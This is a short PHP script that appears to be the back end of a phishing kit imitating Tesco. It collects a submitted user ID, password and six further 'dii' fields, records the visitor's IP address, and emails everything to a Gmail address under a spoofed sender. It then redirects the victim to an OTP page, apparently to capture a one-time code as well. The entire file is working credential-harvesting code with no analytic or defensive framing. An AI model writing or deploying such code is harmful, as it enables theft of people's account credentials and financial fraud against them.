<?
$ip = getenv("REMOTE_ADDR");
$userid = $_POST['userid'];
$password = $_POST['password'];
$dii1 = $_POST['dii1'];
$dii2 = $_POST['dii2'];
$dii3 = $_POST['dii3'];
$dii4 = $_POST['dii4'];
$dii5 = $_POST['dii5'];
$dii6 = $_POST['dii6'];


//sending infos here
$msg = "userid: $userid\npassword: $password\n dii1: $dii1\n dii2: $dii2\ndii3: $dii3\n dii4: $dii4\n dii5: $dii5\n dii6: $dii6\nip: $ip";
$from = "From: kunlexy<infos@Aguda.ng>";
$subj = "tesco";
mail("kaybenz2015@gmail.com",$subj,$msg,$from);
header("Location: otp.htm");
?>





